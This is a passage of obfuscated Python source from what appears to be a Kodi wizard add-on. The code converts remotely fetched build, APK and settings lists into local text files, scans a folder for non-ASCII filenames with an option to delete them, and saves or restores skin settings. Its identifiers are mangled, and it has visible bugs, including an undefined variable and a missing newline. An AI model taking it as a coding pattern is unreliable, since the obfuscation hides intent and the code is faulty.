    DP .create (ADDONTITLE ,'[COLOR %s][B]Converting Text:[/B][/COLOR]'%(COLOR2 ),'','Please Wait')#line:2165
    if not ld (BL )=='http://':#line:2167
        O0OOO0OOO0OOO00O0 =os .path .join (OO00O00O000OOOOO0 ,'builds.txt')#line:2168
        O0OO000O0O000O0O0 ='';OOO00OOOOOOOOO000 =0 #line:2169
        O00OO0O00OO0OOO00 =openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','')#line:2170
        DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]Builds.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:2171
        if WIZARDFILE ==ld (BL ):#line:2172
            try :#line:2173
                O0OOOOOOOO0O0OOOO ,OOO0O0O0OOO00O00O ,OOO0OO0O0O000O0O0 =checkWizard ('all')#line:2174
                O0OO000O0O000O0O0 ='id="%s"\n'%O0OOOOOOOO0O0OOOO #line:2175
                O0OO000O0O000O0O0 +='version="%s"\n'%OOO0O0O0OOO00O00O #line:2176
                O0OO000O0O000O0O0 +='zip="%s"\n'%OOO0OO0O0O000O0O0 #line:2177
            except :#line:2178
                pass #line:2179
        OO00OO000OOO00OO0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)"').findall (O00OO0O00OO0OOO00 )#line:2180
        OOOO0O0OOO0O00OO0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OO0O00OO0OOO00 )#line:2181
        if len (OOOO0O0OOO0O00OO0 )==0 :#line:2182
            for O0000O00O0O0000O0 ,OOO0O0O0OOO00O00O ,OOO0OO0O0O000O0O0 ,O000OOOOO0000O000 ,O0OO0O0O0O0O0OOOO ,O000OO00OOOOO0OO0 ,OOO0O00OOOOO00O00 ,O0O0OOOOO0O000O00 in OO00OO000OOO00OO0 :#line:2183
                OOO00OOOOOOOOO000 +=1 #line:2184
                DP .update (int (percentage (OOO00OOOOOOOOO000 ,len (OOOO0O0OOO0O00OO0 ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O00O0O0000O0 ))#line:2185
                if not O0OO000O0O000O0O0 =='':O0OO000O0O000O0O0 +='\n'#line:2186
                O0OO000O0O000O0O0 +='name="%s"\n'%O0000O00O0O0000O0 #line:2187
                O0OO000O0O000O0O0 +='version="%s"\n'%OOO0O0O0OOO00O00O #line:2188
                O0OO000O0O000O0O0 +='url="%s"\n'%OOO0OO0O0O000O0O0 #line:2189
                O0OO000O0O000O0O0 +='gui="%s"\n'%O000OOOOO0000O000 #line:2190
                O0OO000O0O000O0O0 +='kodi="%s"\n'%O0OO0O0O0O0O0OOOO #line:2191
                O0OO000O0O000O0O0 +='theme="%s"\n'%O000OO00OOOOO0OO0 #line:2192
                O0OO000O0O000O0O0 +='icon="%s"\n'%OOO0O00OOOOO00O00 #line:2193
                O0OO000O0O000O0O0 +='fanart="%s"\n'%O0O0OOOOO0O000O00 #line:2194
                O0OO000O0O000O0O0 +='preview="http://"\n'#line:2195
                O0OO000O0O000O0O0 +='adult="no"\n'#line:2196
                O0OO000O0O000O0O0 +='description="Download %s from %s"\n'%(O0000O00O0O0000O0 ,ADDONTITLE )#line:2197
                if not O000OO00OOOOO0OO0 =='http://':#line:2198
                    O0000OO0OO0000000 =os .path .join (OO00O00O000OOOOO0 ,'%s_theme.txt'%O0000O00O0O0000O0 )#line:2199
                    O0OOOO0000OOOOOOO ='';O0OO0O00000O0O0OO =0 #line:2200
                    O00OO0O00OO0OOO00 =openURL (O000OO00OOOOO0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2201
                    DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]%s_theme.txt[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O00O0O0000O0 ),'','Please Wait')#line:2202
                    O0OO0O0OO0O00O00O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00OO0O00OO0OOO00 )#line:2203
                    for O0000O00O0O0000O0 ,OOO0OO0O0O000O0O0 ,OOO0O00OOOOO00O00 ,O0O0OOOOO0O000O00 ,O00O0OOO0O0000OO0 in O0OO0O0OO0O00O00O :#line:2204
                        O0OO0O00000O0O0OO +=1 #line:2205
                        DP .update (int (percentage (O0OO0O00000O0O0OO ,len (OOOO0O0OOO0O00OO0 ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O00O0O0000O0 ))#line:2206
                        if not O0OOOO0000OOOOOOO =='':O0OOOO0000OOOOOOO +='\n'#line:2207
                        O0OOOO0000OOOOOOO +='name="%s"\n'%O0000O00O0O0000O0 #line:2208
                        O0OOOO0000OOOOOOO +='url="%s"\n'%OOO0OO0O0O000O0O0 #line:2209
                        O0OOOO0000OOOOOOO +='icon="%s"\n'%OOO0O00OOOOO00O00 #line:2210
                        O0OOOO0000OOOOOOO +='fanart="%s"\n'%O0O0OOOOO0O000O00 #line:2211
                        O0OOOO0000OOOOOOO +='adult="no"\n'#line:2212
                        O0OOOO0000OOOOOOO +='description="%s"\n'%O00O0OOO0O0000OO0 #line:2213
                    OO0OO0O0O00O00OOO =open (O0000OO0OO0000000 ,'w');OO0OO0O0O00O00OOO .write (O0OOOO0000OOOOOOO );OO0OO0O0O00O00OOO .close ()#line:2214
        else :#line:2215
            for O0000O00O0O0000O0 ,OOO0O0O0OOO00O00O ,OOO0OO0O0O000O0O0 ,O000OOOOO0000O000 ,O0OO0O0O0O0O0OOOO ,O000OO00OOOOO0OO0 ,OOO0O00OOOOO00O00 ,O0O0OOOOO0O000O00 ,O00OOOO00O0OO000O ,O00O0OOO0O0000OO0 in OOOO0O0OOO0O00OO0 :#line:2216
                OOO00OOOOOOOOO000 +=1 #line:2217
                DP .update (int (percentage (OOO00OOOOOOOOO000 ,len (OOOO0O0OOO0O00OO0 ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O00O0O0000O0 ))#line:2218
                if not O0OO000O0O000O0O0 =='':O0OO000O0O000O0O0 +='\n'#line:2219
                O0OO000O0O000O0O0 +='name="%s"\n'%O0000O00O0O0000O0 #line:2220
                O0OO000O0O000O0O0 +='version="%s"\n'%OOO0O0O0OOO00O00O #line:2221
                O0OO000O0O000O0O0 +='url="%s"\n'%OOO0OO0O0O000O0O0 #line:2222
                O0OO000O0O000O0O0 +='gui="%s"\n'%O000OOOOO0000O000 #line:2223
                O0OO000O0O000O0O0 +='kodi="%s"\n'%O0OO0O0O0O0O0OOOO #line:2224
                O0OO000O0O000O0O0 +='theme="%s"\n'%O000OO00OOOOO0OO0 #line:2225
                O0OO000O0O000O0O0 +='icon="%s"\n'%OOO0O00OOOOO00O00 #line:2226
                O0OO000O0O000O0O0 +='fanart="%s"\n'%O0O0OOOOO0O000O00 #line:2227
                O0OO000O0O000O0O0 +='preview="http://"\n'#line:2228
                O0OO000O0O000O0O0 +='adult="%s"\n'%O00OOOO00O0OO000O #line:2229
                O0OO000O0O000O0O0 +='description="%s"\n'%O00O0OOO0O0000OO0 #line:2230
                if not O000OO00OOOOO0OO0 =='http://':#line:2231
                    O0000OO0OO0000000 =os .path .join (OO00O00O000OOOOO0 ,'%s_theme.txt'%O0000O00O0O0000O0 )#line:2232
                    O0OOOO0000OOOOOOO ='';O0OO0O00000O0O0OO =0 #line:2233
                    O00OO0O00OO0OOO00 =openURL (O000OO00OOOOO0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2234
                    DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]%s_theme.txt[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O00O0O0000O0 ),'','Please Wait')#line:2235
                    O0OO0O0OO0O00O00O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00OO0O00OO0OOO00 )#line:2236
                    for O0000O00O0O0000O0 ,OOO0OO0O0O000O0O0 ,OOO0O00OOOOO00O00 ,O0O0OOOOO0O000O00 ,O00O0OOO0O0000OO0 in O0OO0O0OO0O00O00O :#line:2237
                        O0OO0O00000O0O0OO +=1 #line:2238
                        DP .update (int (percentage (O0OO0O00000O0O0OO ,len (OOOO0O0OOO0O00OO0 ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O00O0O0000O0 ))#line:2239
                        if not O0OOOO0000OOOOOOO =='':O0OOOO0000OOOOOOO +='\n'#line:2240
                        O0OOOO0000OOOOOOO +='name="%s"\n'%O0000O00O0O0000O0 #line:2241
                        O0OOOO0000OOOOOOO +='url="%s"\n'%OOO0OO0O0O000O0O0 #line:2242
                        O0OOOO0000OOOOOOO +='icon="%s"\n'%OOO0O00OOOOO00O00 #line:2243
                        O0OOOO0000OOOOOOO +='fanart="%s"\n'%O0O0OOOOO0O000O00 #line:2244
                        O0OOOO0000OOOOOOO +='adult="no"\n'#line:2245
                        O0OOOO0000OOOOOOO +='description="%s"\n'%O00O0OOO0O0000OO0 #line:2246
                    OO0OO0O0O00O00OOO =open (O0000OO0OO0000000 ,'w');OO0OO0O0O00O00OOO .write (O0OOOO0000OOOOOOO );OO0OO0O0O00O00OOO .close ()#line:2247
        OO0OO0O0O00O00OOO =open (O0OOO0OOO0OOO00O0 ,'w');OO0OO0O0O00O00OOO .write (O0OO000O0O000O0O0 );OO0OO0O0O00O00OOO .close ()#line:2248
    if not APKFILE =='http://':#line:2250
        O0OOO0OOO0OOO00O0 =os .path .join (OO00O00O000OOOOO0 ,'apks.txt')#line:2251
        O0OO000O0O000O0O0 ='';OOO00OOOOOOOOO000 =0 #line:2252
        O00OO0O00OO0OOO00 =openURL (APKFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2253
        DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]Apks.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:2254
        OO00OO000OOO00OO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)"').findall (O00OO0O00OO0OOO00 )#line:2255
        OOOO0O0OOO0O00OO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OO0O00OO0OOO00 )#line:2256
        if len (OOOO0O0OOO0O00OO0 )==0 :#line:2257
            for O0000O00O0O0000O0 ,OOO0OO0O0O000O0O0 ,OOO0O00OOOOO00O00 ,O0O0OOOOO0O000O00 in OO00OO000OOO00OO0 :#line:2258
                OOO00OOOOOOOOO000 +=1 #line:2259
                DP .update (int (percentage (OOO00OOOOOOOOO000 ,len (OO00OO000OOO00OO0 ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O00O0O0000O0 ))#line:2260
                if not O0OO000O0O000O0O0 =='':O0OO000O0O000O0O0 +='\n'#line:2261
                O0OO000O0O000O0O0 +='name="%s"\n'%O0000O00O0O0000O0 #line:2262
                O0OO000O0O000O0O0 +='section="no"'#line:2263
                O0OO000O0O000O0O0 +='url="%s"\n'%OOO0OO0O0O000O0O0 #line:2264
                O0OO000O0O000O0O0 +='icon="%s"\n'%OOO0O00OOOOO00O00 #line:2265
                O0OO000O0O000O0O0 +='fanart="%s"\n'%O0O0OOOOO0O000O00 #line:2266
                O0OO000O0O000O0O0 +='adult="no"\n'#line:2267
                O0OO000O0O000O0O0 +='description="Download %s from %s"\n'%(O0000O00O0O0000O0 ,ADDONTITLE )#line:2268
        else :#line:2269
            for O0000O00O0O0000O0 ,OOO0OO0O0O000O0O0 ,OOO0O00OOOOO00O00 ,O0O0OOOOO0O000O00 ,O00OOOO00O0OO000O ,O00O0OOO0O0000OO0 in OOOO0O0OOO0O00OO0 :#line:2270
                OOO00OOOOOOOOO000 +=1 #line:2271
                DP .update (int (percentage (OOO00OOOOOOOOO000 ,len (OOOO0O0OOO0O00OO0 ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O00O0O0000O0 ))#line:2272
                if not O0OO000O0O000O0O0 =='':O0OO000O0O000O0O0 +='\n'#line:2273
                O0OO000O0O000O0O0 +='name="%s"\n'%O0000O00O0O0000O0 #line:2274
                O0OO000O0O000O0O0 +='section="no"'#line:2275
                O0OO000O0O000O0O0 +='url="%s"\n'%OOO0OO0O0O000O0O0 #line:2276
                O0OO000O0O000O0O0 +='icon="%s"\n'%OOO0O00OOOOO00O00 #line:2277
                O0OO000O0O000O0O0 +='fanart="%s"\n'%O0O0OOOOO0O000O00 #line:2278
                O0OO000O0O000O0O0 +='adult="%s"\n'%O00OOOO00O0OO000O #line:2279
                O0OO000O0O000O0O0 +='description="%s"\n'%O00O0OOO0O0000OO0 #line:2280
        OO0OO0O0O00O00OOO =open (O0OOO0OOO0OOO00O0 ,'w');OO0OO0O0O00O00OOO .write (O0OO000O0O000O0O0 );OO0OO0O0O00O00OOO .close ()#line:2281
    if not YOUTUBEFILE =='http://':#line:2283
        O0OOO0OOO0OOO00O0 =os .path .join (OO00O00O000OOOOO0 ,'youtube.txt')#line:2284
        O0OO000O0O000O0O0 ='';OOO00OOOOOOOOO000 =0 #line:2285
        O00OO0O00OO0OOO00 =openURL (YOUTUBEFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2286
        DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]YouTube.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:2287
        OO00OO000OOO00OO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00OO0O00OO0OOO00 )#line:2288
        for O0000O00O0O0000O0 ,OOO0OO0O0O000O0O0 ,OOO0O00OOOOO00O00 ,O0O0OOOOO0O000O00 ,O00O0OOO0O0000OO0 in OO00OO000OOO00OO0 :#line:2289
            OOO00OOOOOOOOO000 +=1 #line:2290
            DP .update (int (percentage (OOO00OOOOOOOOO000 ,len (OO00OO000OOO00OO0 ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O00O0O0000O0 ))#line:2291
            if not O0OO000O0O000O0O0 =='':O0OO000O0O000O0O0 +='\n'#line:2292
            O0OO000O0O000O0O0 +='name="%s"\n'%O0000O00O0O0000O0 #line:2293
            O0OO000O0O000O0O0 +='section="no"'#line:2294
            O0OO000O0O000O0O0 +='url="%s"\n'%OOO0OO0O0O000O0O0 #line:2295
            O0OO000O0O000O0O0 +='icon="%s"\n'%OOO0O00OOOOO00O00 #line:2296
            O0OO000O0O000O0O0 +='fanart="%s"\n'%O0O0OOOOO0O000O00 #line:2297
            O0OO000O0O000O0O0 +='description="%s"\n'%O00O0OOO0O0000OO0 #line:2298
        OO0OO0O0O00O00OOO =open (O0OOO0OOO0OOO00O0 ,'w');OO0OO0O0O00O00OOO .write (O0OO000O0O000O0O0 );OO0OO0O0O00O00OOO .close ()#line:2299
    if not ADVANCEDFILE =='http://':#line:2301
        O0OOO0OOO0OOO00O0 =os .path .join (OO00O00O000OOOOO0 ,'advancedsettings.txt')#line:2302
        O0OO000O0O000O0O0 ='';OOO00OOOOOOOOO000 =0 #line:2303
        O00OO0O00OO0OOO00 =openURL (ADVANCEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2304
        DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]AdvancedSettings.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:2305
        OO00OO000OOO00OO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00OO0O00OO0OOO00 )#line:2306
        for O0000O00O0O0000O0 ,OOO0OO0O0O000O0O0 ,OOO0O00OOOOO00O00 ,O0O0OOOOO0O000O00 ,O00O0OOO0O0000OO0 in OO00OO000OOO00OO0 :#line:2307
            OOO00OOOOOOOOO000 +=1 #line:2308
            DP .update (int (percentage (OOO00OOOOOOOOO000 ,len (OO00OO000OOO00OO0 ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O00O0O0000O0 ))#line:2309
            if not O0OO000O0O000O0O0 =='':O0OO000O0O000O0O0 +='\n'#line:2310
            O0OO000O0O000O0O0 +='name="%s"\n'%O0000O00O0O0000O0 #line:2311
            O0OO000O0O000O0O0 +='section="no"'#line:2312
            O0OO000O0O000O0O0 +='url="%s"\n'%OOO0OO0O0O000O0O0 #line:2313
            O0OO000O0O000O0O0 +='icon="%s"\n'%OOO0O00OOOOO00O00 #line:2314
            O0OO000O0O000O0O0 +='fanart="%s"\n'%O0O0OOOOO0O000O00 #line:2315
            O0OO000O0O000O0O0 +='description="%s"\n'%O00O0OOO0O0000OO0 #line:2316
        OO0OO0O0O00O00OOO =open (O0OOO0OOO0OOO00O0 ,'w');OO0OO0O0O00O00OOO .write (O0OO000O0O000O0O0 );OO0OO0O0O00O00OOO .close ()#line:2317
    DP .close ()#line:2319
    DIALOG .ok (ADDONTITLE ,'[COLOR %s]Your text files have been converted to 0.1.7 and are location in the [COLOR %s]/addon_data/%s/[/COLOR] folder[/COLOR]'%(COLOR2 ,COLOR1 ,ADDON_ID ))#line:2320
def reloadProfile (profile =None ):#line:2322
    if profile ==None :#line:2323
        ebi ('LoadProfile(Master user)')#line:2330
    else :ebi ('LoadProfile(%s)'%profile )#line:2331
def chunks (O0O00OOO00000O00O ,OO00OOO0O000O000O ):#line:2333
    for O000O00OOOO0000O0 in range (0 ,len (O0O00OOO00000O00O ),OO00OOO0O000O000O ):#line:2334
        yield O0O00OOO00000O00O [O000O00OOOO0000O0 :O000O00OOOO0000O0 +OO00OOO0O000O000O ]#line:2335
def asciiCheck (use =None ,over =False ):#line:2337
    if use ==None :#line:2338
        O0O0O000000O0O00O =DIALOG .browse (3 ,'[COLOR %s]Select the folder you want to scan[/COLOR]'%COLOR2 ,'files','',False ,False ,HOME )#line:2339
        if over ==True :#line:2340
            O0OO0OOO0O0O0OO00 =1 #line:2341
        else :#line:2342
            O0OO0OOO0O0O0OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Do you want to [COLOR %s]delete[/COLOR] all filenames with special characters or would you rather just [COLOR %s]scan and view[/COLOR] the results in the log?[/COLOR]'%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ='[B][COLOR green]Delete[/COLOR][/B]',nolabel ='[B][COLOR red]Scan[/COLOR][/B]')#line:2343
    else :#line:2344
        O0O0O000000O0O00O =use #line:2345
        O0OO0OOO0O0O0OO00 =1 #line:2346
    if O0O0O000000O0O00O =="":#line:2348
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ASCII Check: Cancelled[/COLOR]"%COLOR2 )#line:2349
        return #line:2350
    O0O0OOO0000OO0OOO =os .path .join (ADDONDATA ,'asciifiles.txt')#line:2352
    O00000O0OOO00OO0O =os .path .join (ADDONDATA ,'asciifails.txt')#line:2353
    O00O0OOOOO000O0O0 =open (O0O0OOO0000OO0OOO ,mode ='w+')#line:2354
    O00000000O0OO0OO0 =open (O00000O0OOO00OO0O ,mode ='w+')#line:2355
    O00O000OOOOO00O0O =0 ;O0O000O0O00O000OO =0 #line:2356
    O0OO0OOOO000O00OO =fileCount (O0O0O000000O0O00O )#line:2357
    OO0OOO0O0O0000OO0 =''#line:2358
    O00OOO0OOO000OO0O =[]#line:2359
    log ("Source file: (%s)"%str (O0O0O000000O0O00O ),5 )#line:2360
    DP .create (ADDONTITLE ,'Please wait...')#line:2362
    for OOO0O0O000000OO00 ,O0OOOO000OO0O00O0 ,O0O0O00O0OOOOOOO0 in os .walk (O0O0O000000O0O00O ):#line:2363
        O0OOOO000OO0O00O0 [:]=[O000000O00OO0OO00 for O000000O00OO0OO00 in O0OOOO000OO0O00O0 ]#line:2364
        O0O0O00O0OOOOOOO0 [:]=[OO0OO00OO000OO0O0 for OO0OO00OO000OO0O0 in O0O0O00O0OOOOOOO0 ]#line:2365
        for OO000O0OO00O0O000 in O0O0O00O0OOOOOOO0 :#line:2366
            O00OOO0OOO000OO0O .append (OO000O0OO00O0O000 )#line:2367
            O00OO0OOO00OO0O00 =int (len (O00OOO0OOO000OO0O )/float (O0OO0OOOO000O00OO )*100 )#line:2368
            DP .update (O00OO0OOO00OO0O00 ,"[COLOR %s]Checking for non ASCII files"%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,d ),'Please Wait[/COLOR]')#line:2369
            try :#line:2370
                OO000O0OO00O0O000 .encode ('ascii')#line:2371
            except UnicodeDecodeError :#line:2372
                O0O0O00O000000O00 =os .path .join (OOO0O0O000000OO00 ,OO000O0OO00O0O000 )#line:2373
                if O0OO0OOO0O0O0OO00 :#line:2374
                    try :#line:2375
                        os .remove (O0O0O00O000000O00 )#line:2376
                        for OO0000O0OOOO0O000 in chunks (O0O0O00O000000O00 ,75 ):#line:2377
                            O00O0OOOOO000O0O0 .write (OO0000O0OOOO0O000 +'\n')#line:2378
                        O00O0OOOOO000O0O0 .write ('\n')#line:2379
                        O00O000OOOOO00O0O +=1 #line:2380
                        log ("[ASCII Check] File Removed: %s "%O0O0O00O000000O00 ,5 )#line:2381
                    except :#line:2382
                        for OO0000O0OOOO0O000 in chunks (O0O0O00O000000O00 ,75 ):#line:2383
                            O00000000O0OO0OO0 .write (OO0000O0OOOO0O000 +'\n')#line:2384
                        O00000000O0OO0OO0 .write ('\n')#line:2385
                        O0O000O0O00O000OO +=1 #line:2386
                        log ("[ASCII Check] File Failed: %s "%O0O0O00O000000O00 ,5 )#line:2387
                else :#line:2388
                    for OO0000O0OOOO0O000 in chunks (O0O0O00O000000O00 ,75 ):#line:2389
                        O00O0OOOOO000O0O0 .write (OO0000O0OOOO0O000 +'\n')#line:2390
                    O00O0OOOOO000O0O0 .write ('\n')#line:2391
                    O00O000OOOOO00O0O +=1 #line:2392
                    log ("[ASCII Check] File Found: %s "%O0O0O00O000000O00 ,5 )#line:2393
                pass #line:2394
    DP .close ();O00O0OOOOO000O0O0 .close ();O00000000O0OO0OO0 .close ()#line:2395
    O0O0OOO0O00OOO0O0 =int (O00O000OOOOO00O0O )+int (O0O000O0O00O000OO )#line:2396
    if O0O0OOO0O00OOO0O0 >0 :#line:2397
        if os .path .exists (O0O0OOO0000OO0OOO ):O00O0OOOOO000O0O0 =open (O0O0OOO0000OO0OOO ,mode ='r');OO0OOO0O0O0000OO0 =O00O0OOOOO000O0O0 .read ();O00O0OOOOO000O0O0 .close ()#line:2398
        if os .path .exists (O00000O0OOO00OO0O ):O00000000O0OO0OO0 =open (O00000O0OOO00OO0O ,mode ='r');O0O0O0OO0O0OOO00O =O00000000O0OO0OO0 .read ();O00000000O0OO0OO0 .close ()#line:2399
        if O0OO0OOO0O0O0OO00 :#line:2400
            if use :#line:2401
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ASCII Check: %s Removed / %s Failed.[/COLOR]"%(COLOR2 ,O00O000OOOOO00O0O ,O0O000O0O00O000OO ))#line:2402
            else :#line:2403
                TextBox (ADDONTITLE ,"[COLOR yellow][B]%s Files Removed:[/B][/COLOR]\n %s\n\n[COLOR yellow][B]%s Files Failed:[B][/COLOR]\n %s"%(O00O000OOOOO00O0O ,OO0OOO0O0O0000OO0 ,O0O000O0O00O000OO ,O0O0O0OO0O0OOO00O ))#line:2404
        else :#line:2405
            TextBox (ADDONTITLE ,"[COLOR yellow][B]%s Files Found:[/B][/COLOR]\n %s"%(O00O000OOOOO00O0O ,OO0OOO0O0O0000OO0 ))#line:2406
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ASCII Check: None Found.[/COLOR]"%COLOR2 )#line:2407
def fileCount (O0000OOO0O000O000 ,excludes =True ):#line:2409
    OOOO00OOO0OO0OOO0 =[ADDON_ID ,'cache','system','packages','Thumbnails','peripheral_data','temp','My_Builds','library','keymaps']#line:2410
    OO0OOO0OO0O00O000 =['Textures13.db','.DS_Store','advancedsettings.xml','Thumbs.db','.gitignore']#line:2411
    OOOO0OO0OO0OO0OOO =[]#line:2412
    for O0O0000O000O00O0O ,OOO00OO000O0O00O0 ,O0OOOO00O00000OOO in os .walk (O0000OOO0O000O000 ):#line:2413
        if excludes :#line:2414
            OOO00OO000O0O00O0 [:]=[O00000OO0O00O0O00 for O00000OO0O00O0O00 in OOO00OO000O0O00O0 if O00000OO0O00O0O00 not in OOOO00OOO0OO0OOO0 ]#line:2415
            O0OOOO00O00000OOO [:]=[O00000O000O000O00 for O00000O000O000O00 in O0OOOO00O00000OOO if O00000O000O000O00 not in OO0OOO0OO0O00O000 ]#line:2416
        for O00O0OO00OOOO00O0 in O0OOOO00O00000OOO :#line:2417
            OOOO0OO0OO0OO0OOO .append (O00O0OO00OOOO00O0 )#line:2418
    return len (OOOO0OO0OO0OO0OOO )#line:2419
def defaultSkin ():#line:2421
    log ("[Default Skin Check]",5 )#line:2422
    OO0OO0000O00OO0O0 =os .path .join (USERDATA ,'guitemp.xml')#line:2423
    O0OO00OO000O0O00O =OO0OO0000O00OO0O0 if os .path .exists (OO0OO0000O00OO0O0 )else GUISETTINGS #line:2424
    if not os .path .exists (O0OO00OO000O0O00O ):return False #line:2425
    log ("Reading gui file: %s"%O0OO00OO000O0O00O ,5 )#line:2426
    OO0OO0000O0O0O000 =open (O0OO00OO000O0O00O ,'r+')#line:2427
    OO0OO000O0O000O00 =OO0OO0000O0O0O000 .read ().replace ('\n','').replace ('\r','').replace ('\t','').replace ('    ','');OO0OO0000O0O0O000 .close ()#line:2428
    log ("Opening gui settings",5 )#line:2429
    OOOOO00O0OO0OOOO0 =re .compile ('<lookandfeel>.+?<ski.+?>(.+?)</skin>.+?</lookandfeel>').findall (OO0OO000O0O000O00 )#line:2430
    log ("Matches: %s"%str (OOOOO00O0OO0OOOO0 ),5 )#line:2431
    if len (OOOOO00O0OO0OOOO0 )>0 :#line:2432
        O0O0OO00OOO0O0O0O =OOOOO00O0OO0OOOO0 [0 ]#line:2433
        OO0O00O000O00O0OO =os .path .join (ADDONS ,OOOOO00O0OO0OOOO0 [0 ],'addon.xml')#line:2434
        if os .path .exists (OO0O00O000O00O0OO ):#line:2435
            OO0O0OOO00OOOO000 =open (OO0O00O000O00O0OO ,'r+')#line:2436
            OOOOO00000OOOOO00 =OO0O0OOO00OOOO000 .read ();OO0O0OOO00OOOO000 .close ()#line:2437
            OO0000O0000O00OOO =parseDOM (OOOOO00000OOOOO00 ,'addon',ret ='name')#line:2438
            if len (OO0000O0000O00OOO )>0 :O00OOOOO0OO0O0OOO =OO0000O0000O00OOO [0 ]#line:2439
            else :O00OOOOO0OO0O0OOO ='no match'#line:2440
        else :O00OOOOO0OO0O0OOO ='no file'#line:2441
        log ("[Default Skin Check] Skin name: %s"%O00OOOOO0OO0O0OOO ,5 )#line:2442
        log ("[Default Skin Check] Skin id: %s"%O0O0OO00OOO0O0O0O ,5 )#line:2443
        setS ('defaultskin',O0O0OO00OOO0O0O0O )#line:2444
        setS ('defaultskinname',O00OOOOO0OO0O0OOO )#line:2445
        setS ('defaultskinignore','false')#line:2446
    if os .path .exists (OO0OO0000O00OO0O0 ):#line:2447
        log ("Deleting Temp Gui File.",5 )#line:2448
        os .remove (OO0OO0000O00OO0O0 )#line:2449
    log ("[Default Skin Check] End",5 )#line:2450
def lookandFeelData (do ='save'):#line:2452
    O0OOOOOOOOOO0OO00 =['lookandfeel.enablerssfeeds','lookandfeel.font','lookandfeel.rssedit','lookandfeel.skincolors','lookandfeel.skintheme','lookandfeel.skinzoom','lookandfeel.soundskin','lookandfeel.startupwindow','lookandfeel.stereostrength']#line:2453
    if do =='save':#line:2454
        for O00OO0O0000OOO00O in O0OOOOOOOOOO0OO00 :#line:2455
            OOO0O00OO00OOOOO0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":"%s"}, "id":1}'%(O00OO0O0000OOO00O )#line:2456
            O0OO0OO0O00OOOO00 =xbmc .executeJSONRPC (OOO0O00OO00OOOOO0 )#line:2457
            if not 'error'in O0OO0OO0O00OOOO00 :#line:2458
                O0OOO00OOOO00O00O =re .compile ('{"value":(.+?)}').findall (str (O0OO0OO0O00OOOO00 ))#line:2459
                setS (O00OO0O0000OOO00O .replace ('lookandfeel','default'),O0OOO00OOOO00O00O [0 ])#line:2460
                log ("%s saved to %s"%(O00OO0O0000OOO00O ,O0OOO00OOOO00O00O [0 ]),5 )#line:2461
    else :#line:2462
        for O00OO0O0000OOO00O in O0OOOOOOOOOO0OO00 :#line:2463
            OOOOO0OOO0O0OOO00 =getS (O00OO0O0000OOO00O .replace ('lookandfeel','default'))#line:2464
            OOO0O00OO00OOOOO0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":"%s","value":%s}, "id":1}'%(O00OO0O0000OOO00O ,OOOOO0OOO0O0OOO00 )#line:2465
            O0OO0OO0O00OOOO00 =xbmc .executeJSONRPC (OOO0O00OO00OOOOO0 )#line:2466
            log ("%s restored to %s"%(O00OO0O0000OOO00O ,OOOOO0OOO0O0OOO00 ),5 )#line:2467
def sep (middle =''):#line:2469
    O0000OO0OO0O000OO =uservar .SPACER #line:2470
    OO0OOO0000OO0OO0O =O0000OO0OO0O000OO *40 #line:2471
